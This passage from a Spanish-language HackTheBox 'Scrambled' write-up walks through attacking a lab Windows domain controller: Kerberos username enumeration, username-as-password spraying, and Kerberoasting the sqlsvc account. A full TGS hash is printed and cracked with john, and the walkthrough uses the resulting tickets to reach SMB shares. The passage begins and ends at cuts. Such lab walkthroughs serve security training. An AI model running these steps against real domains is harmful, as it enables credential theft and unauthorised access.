SF:TLSSessionReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,1D,<span class="s2">"SC
SF:RAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,1D,<span class="s2">"SCRAMBLECORP_ORDERS_
SF:V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Fo
SF:urOhFourRequest,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMM
SF:AND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LPDString,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNO
SF:WN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LDAPSearchReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">
SF:"</span><span class="o">)</span>%r<span class="o">(</span>LDAPBindReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,3
SF:5,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LAND
SF:esk-RC,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServer,1D,<span class="s2">"SCR
SF:AMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>NCP,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3
SF:;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>NotesRPC,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>JavaRMI,1D
SF:,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>WMSRequest,1D,<span class="s2">"SCRAMBLECORP_ORD
SF:ERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>oracle-tns,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span>
SF:<span class="o">)</span>%r<span class="o">(</span>ms-sql-s,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>afp,1D,<span class="s2">"SCRAMBLE
SF:CORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>giop,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\</span><span class="s2">
SF:n"</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-30T00:28:22
|_  start_date: N/A
|_clock-skew: mean: <span class="nt">-4s</span>, deviation: 0s, median: <span class="nt">-4s</span>
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>De primeras no vemos nada de información relevante sobre la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.168
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.168<span class="o">)</span> <span class="o">(</span>domain:10.10.11.168<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Como la maquina tiene muchos puertos abiertos podemos probar con otro protocolo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme ldap 10.10.11.168
LDAP        10.10.11.168    389    DC1.scrm.local   <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:DC1.scrm.local<span class="o">)</span> <span class="o">(</span>domain:scrm.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos agregar los dominios al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.168 scrm.local DC1.scrm.local dc1.scrm.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.168 scrm.local DC1.scrm.local dc1.scrm.local
</code></pre></div></div>

<ul>
  <li>Al parecer tenemos limitaciones para enumerar por el protocolo <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.11.168 <span class="nt">--shares</span>
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.168<span class="o">)</span> <span class="o">(</span>domain:10.10.11.168<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span>-] Error enumerating shares: STATUS_USER_SESSION_DELETED
➜  nmap smbmap <span class="nt">-H</span> 10.10.11.168 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 0 SMB session<span class="o">(</span>s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Tampoco podemos enumerar por el protocolo <strong>RPC</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.10.11.168
Cannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED
</code></pre></div></div>

<ul>
  <li>Tenemos el puerto <strong>80</strong> abierto a si que podemos ver su contenido y si encontramos algo interesante.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">,</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Scramble</span> <span class="no">Corp</span> <span class="no">Intranet</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/1.png" />
</p>

<ul>
  <li>
    <p>En la parte de <code class="language-plaintext highlighter-rouge">IT Services</code> encontramos lo siguiente.</p>
  </li>
  <li>
    <p>Nos dicen que debido a la brecha de seguridad que hubo el mes pasado deshabilitaron la autenticación NTLM pero dice que seamos pacientes mientras trabajan en resolverlo.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/2.png" />
</p>

<ul>
  <li>Tenemos <code class="language-plaintext highlighter-rouge">Resources</code> interesantes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/3.png" />
</p>

<ul>
  <li>Probando en <code class="language-plaintext highlighter-rouge">New User Account</code> no funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/4.png" />
</p>

<ul>
  <li>Pero en <strong>Contacting IT Support</strong> vemos un nombre de usuario que es <code class="language-plaintext highlighter-rouge">ksimpson</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/5.png" />
</p>

<ul>
  <li>Podemos usa <code class="language-plaintext highlighter-rouge">kerbrute</code> para verificar que sea un usuario del dominio pero como no sabemos si existan mas usuarios podemos usar un diccionario <a href="https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt">https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt</a> para enumerar mas usuarios en caso de que los allá.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap /opt/kerbrute_linux_amd64 userenum <span class="nt">-d</span> scrm.local <span class="nt">--dc</span> DC1.scrm.local /opt/A-ZSurnames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/29/24 - Ronnie Flathers @ropnop

2024/04/29 18:53:06 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/29 18:53:06 <span class="o">&gt;</span>  	DC1.scrm.local:88

2024/04/29 18:53:06 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 ASMITH@scrm.local
2024/04/29 18:53:44 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 JHALL@scrm.local
2024/04/29 18:53:48 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 KSIMPSON@scrm.local
2024/04/29 18:53:51 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 KHICKS@scrm.local
2024/04/29 18:54:22 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 SJENKINS@scrm.local
</code></pre></div></div>

<ul>
  <li>Vamos agregarlos a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
asmith
jhall
ksimpson
khicks
sjenkins
</code></pre></div></div>

<ul>
  <li>Si recordamos no tenemos la autenticación <code class="language-plaintext highlighter-rouge">NTLM</code> activada pero podemos probar solicitar un <code class="language-plaintext highlighter-rouge">TGT</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers scrm.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User asmith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User jhall doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User ksimpson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User khicks doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User sjenkins doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>
    <p>Lo que podemos hacer es ver si algún usuario usa su nombre de usuario como su contraseña esto casi siempre suele pasar podemos usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> y <code class="language-plaintext highlighter-rouge">kerbrute</code> para este proceso.</p>
  </li>
  <li>
    <p>Lo hacemos con otro protocolo por que <code class="language-plaintext highlighter-rouge">smb</code> no funciona y de los que tiene contemplado <code class="language-plaintext highlighter-rouge">crackmapexec</code> <code class="language-plaintext highlighter-rouge">ldap</code> si funciona.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme ldap scrm.local <span class="nt">-u</span> users.txt <span class="nt">-p</span> users.txt <span class="nt">-k</span> <span class="nt">--no-bruteforce</span> <span class="nt">--continue-on-success</span>
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:DC1.scrm.local<span class="o">)</span> <span class="o">(</span>domain:scrm.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\a</span>smith:asmith KDC_ERR_PREAUTH_FAILED
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\j</span>hall:jhall KDC_ERR_PREAUTH_FAILED
LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>+] scrm.local<span class="se">\k</span>simpson
LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\k</span>hicks:khicks KDC_ERR_PREAUTH_FAILED
LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\s</span>jenkins:sjenkins KDC_ERR_PREAUTH_FAILED
</code></pre></div></div>

<ul>
  <li>El usuario <code class="language-plaintext highlighter-rouge">ksimson</code> usa como contraseña su nombre de usuario también podemos validarlo con <code class="language-plaintext highlighter-rouge">kerbrute</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 bruteuser <span class="nt">--dc</span> 10.10.11.168 <span class="nt">-d</span> scrm.local users.txt ksimpson

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/29/24 - Ronnie Flathers @ropnop

2024/04/29 19:04:36 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/29 19:04:36 <span class="o">&gt;</span>  	10.10.11.168:88

2024/04/29 19:04:36 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID LOGIN:	 ksimpson@scrm.local:ksimpson
2024/04/29 19:04:36 <span class="o">&gt;</span>  Done! Tested 5 logins <span class="o">(</span>1 successes<span class="o">)</span> <span class="k">in </span>0.400 seconds
</code></pre></div></div>

<h2 id="shell-as-sqlsvc">Shell as SQLSvc</h2>

<ul>
  <li>Como tenemos credenciales podemos probar un <code class="language-plaintext highlighter-rouge">Kerberoasting Attack</code> pero con el parámetro <code class="language-plaintext highlighter-rouge">-k</code> ya que tenemos la atención <code class="language-plaintext highlighter-rouge">NTLM</code> deshabilitada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting machine <span class="nb">hostname</span>
<span class="o">[</span>-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the <span class="nt">-dc-host</span> option
</code></pre></div></div>

<ul>
  <li>Aun así obtenemos un error.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting machine <span class="nb">hostname</span>
<span class="o">[</span>-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the <span class="nt">-dc-host</span> option
</code></pre></div></div>

<ul>
  <li>
    <p>Si buscamos en internet errores al operar con <code class="language-plaintext highlighter-rouge">-k</code> encontramos lo siguiente <a href="https://github.com/fortra/impacket/issues/1206">https://github.com/fortra/impacket/issues/1206</a>.</p>
  </li>
  <li>
    <p>Pero tenemos que cambiar una parte del código en esta parte.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/6.png" />
</p>

<ul>
  <li>Tenemos que cambiarla por esta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/7.png" />
</p>

<ul>
  <li>Ahora ya funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span>-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
<span class="nt">----------------------------</span>  <span class="nt">------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
</code></pre></div></div>

<ul>
  <li>Ahora vamos a obtener el hash del usuario <code class="language-plaintext highlighter-rouge">sqlsvc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local <span class="nt">-request</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span>-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
<span class="nt">----------------------------</span>  <span class="nt">------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991



<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="nv">$krb5tgs$23$*</span>sqlsvc<span class="nv">$SCRM</span>.LOCAL<span class="nv">$scrm</span>.local/sqlsvc<span class="k">*</span><span class="nv">$0404e156f2b44fdc2ccabae35e43d08d$eb31843c7e1cb948d143812b4a93c13e6241e8865b6a807e64c59acd7fdd841f438222bcfb364667dc59bfccc085c29405ca00b652b0b9a90d6c5647a9a3b2d9fdd119d4c85a2fcf490a0340b1649bdb55302cfecdf2bfbd18c6eee115c9e81c27869b976fc589b027e3128dece13b86bc4b8b7b659c733caa0f5a212e4917ff3b6584d52b8597599e9096da96cb2e4904bc848ff4972fee71188c948875c93c6d9aa493c8b02a115db904970717d2704368c1e6a364e6f1c7ba5d5524e9d7d8a11217c707c7a0c040d2b7aca2cc11113aafdcc22d0c3a01ec6f00d3424a959cdaf1adcb2295cf30aeac9cd3e8e96bb85497262171d4718ab7cf20f7b57d64de5e9f645871fbef03f763cb2256c8765d6eae6db3d8cee1109dfb530a782e472bd6b84b7622e91956544f521f76c66399d58b1e892a945316b7f88007c58f49e91f1dd7a7e96a1ed0d1652d16d896150f1e1799f5b733fcec1c3d3c7619892cf6ba0da6cb5239af4be492e3d082fa899eb4abe657a24bf908ff366e8a3c06a2b2462f35f793e690d92091ef264b7a7f440bd2660f42fabf1cef538d7e276825fabdf740859a3621efb81f25ca525ae8763e20d9907b1c37b37cc44bb186a5c39adc5f7d6bbb1f0255bfc9f716f34e2e6079549be7ff3a104ce3c2ecaddabaf0122b7394660c98ec32579f696a1ae20223ae2fd5a5ccebc258413fd6785374bbd6b4b2f40872aaa1e03cd621fdd7bc0860ac1498c26c8c7e82f6c16faeb70908c23bbc1b5ae03c62b55445e781c960ccc5b412320cd8cd0bc3d779a346a9c3940b5f1c3bc7ab8c31efc1d73ac4575c06a0337a03da926bc3a4d86accabd34c95a64569e0b6d089f15db63901de7dd308b9d1e76f7989b48f9f97c600dcaf6dfc3d0372c64b354bb5869f20e034ae1e5ab1a77e9e536351496290eac31e127fe015045c9e1e9a7d82d021b42eaa1773bf3bf87e9b0e52f4758013f7ef4c6cea2998f93c903f2120e09698910fa170dbcfac23920a7551a77285642046fabadb0bf1e822c169846e6d583053c8f9cee5e3775a784e6bd3e55323befa1bf9859a1036e659bb932f75296d14f33e047ced0731d7daf25c20f94c94604e709b5b9307c36f38e81211f7248eb6a05f19dbb78c754e7aa128984aa3eaba2a2c16d2c3fae396c8459c152150e467d06782669c70ada40d5b67361a198d1c945be215402b81b6f43dbfa9b3a12d20b804f9b51bb61568e14793687d8b33d51ed9da783403ebe4b20930b05ee92e44f1046158a01f2c871cf8a118a89b01d168e1fcd936f19101c115d69b1d5ca6ed2cc9acc95c23690287f4e9852b7f5d6af97c92cd5ee2ff82b4e8f32724809394976a75ea91c15c48da114419cca7499b3aeda0a71ff6067e78893d8e8f37941226928c00fa1684cf41fb7bbd30af815213f5</span>
</code></pre></div></div>

<ul>
  <li>Vamos a crackearlo con <code class="language-plaintext highlighter-rouge">john</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Pegasus60        <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:13 DONE <span class="o">(</span>2024-04-29 19:56<span class="o">)</span> 0.07547g/s 809771p/s 809771c/s 809771C/s Peguero..Pearce
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">mssqlclient.py</code> para conectarnos.</p>
  </li>
  <li>
    <p>Pero obtenemos un error.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.10.11.168
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'sqlsvc'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Tenemos que usar <code class="language-plaintext highlighter-rouge">kerberos</code> pero necesitamos un <code class="language-plaintext highlighter-rouge">TGT</code> para poder autenticarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getTGT scrm.local/sqlsvc:Pegasus60
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>sqlsvc.ccache
</code></pre></div></div>

<ul>
  <li>Ahora vamos a exportar la variable de entorno.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>sqlsvc.ccache
</code></pre></div></div>

<ul>
  <li>Pero aun así no podemos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'SCRM\sqlsvc'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a probar con el otro usuario.</p>
  </li>
  <li>
    <p>Pero nada.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getTGT scrm.local/ksimpson:ksimpson
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>ksimpson.ccache
➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>ksimpson.ccache
➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'SCRM\ksimpson'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Como tenemos el <code class="language-plaintext highlighter-rouge">SPN</code> podemos hacer un <code class="language-plaintext highlighter-rouge">Silver Ticket Attack</code> para suplantar un usuario.</p>
  </li>
  <li>
    <p>Pero antes podemos probar enumerar por <code class="language-plaintext highlighter-rouge">smb</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># shares</span>
ADMIN<span class="err">$</span>
C<span class="err">$</span>
HR
IPC<span class="err">$</span>
IT
NETLOGON
Public
Sales
SYSVOL
<span class="c"># use Public</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 <span class="nb">.</span>
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 ..
<span class="nt">-rw-rw-rw-</span>     630106  Fri Nov  5 11:45:07 2021 Network Security Changes.pdf
<span class="c"># get Network Security Changes.pdf</span>
</code></pre></div></div>

<ul>
  <li>Al abrirlo ya vimos por que no podemos conectarnos al parecer solo los administradores pueden.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/8.png" />
</p>

<ul>
